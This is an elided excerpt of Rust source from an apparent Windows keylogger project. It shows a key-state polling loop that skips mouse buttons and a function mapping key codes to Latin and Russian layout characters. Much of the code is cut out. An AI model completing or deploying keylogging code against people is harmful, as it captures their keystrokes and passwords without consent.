// source https://github.com/thomaslienbacher/win-keylogger-rs/blob/master/src/main.rs
...
pub fn do_logging() -> Vec::<String> {
    ...
    for i in 0 as c_int..255 as c_int {
        ...
        let clicks = vec![0x01, 0x02, 0x04, 0x05, 0x06];
        if (key & 1 > 0) && !clicks.contains(&(i as u8)) {
...
fn keycode_to_string(k: u8) -> String {
    if k >= 65 && k <= 90 {
        // letter
        let s = "ФИСВУАПРШОЛДЬТЩЗЙКЫЕГМЦЧНЯ".to_string();
        return format!("{} | {}", ((k) as char), s.chars().nth((k - 65) as usize).unwrap());
    } else if k >= 48 && k <= 57 {
        // numиукы
    ...
    match k {
        ...
        0xBA => { "VK_OEM_1 :; | Ж".to_string() }
        0xBB => { "VK_OEM_PLUS".to_string() }
        0xBC => { "VK_OEM_COMMA ,< | Б".to_string() }
